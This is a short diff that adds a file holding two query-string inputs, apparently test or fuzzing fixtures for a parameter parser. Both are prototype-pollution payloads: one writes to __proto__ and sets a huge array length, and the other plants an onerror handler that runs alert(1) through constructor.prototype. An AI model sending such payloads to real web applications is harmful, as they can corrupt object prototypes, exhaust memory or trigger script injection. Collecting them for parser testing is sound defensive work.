@@ -1,0 +1,3 @@
+a[__proto__]=b&a[__proto__]&a[length]=100000000
+a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
+
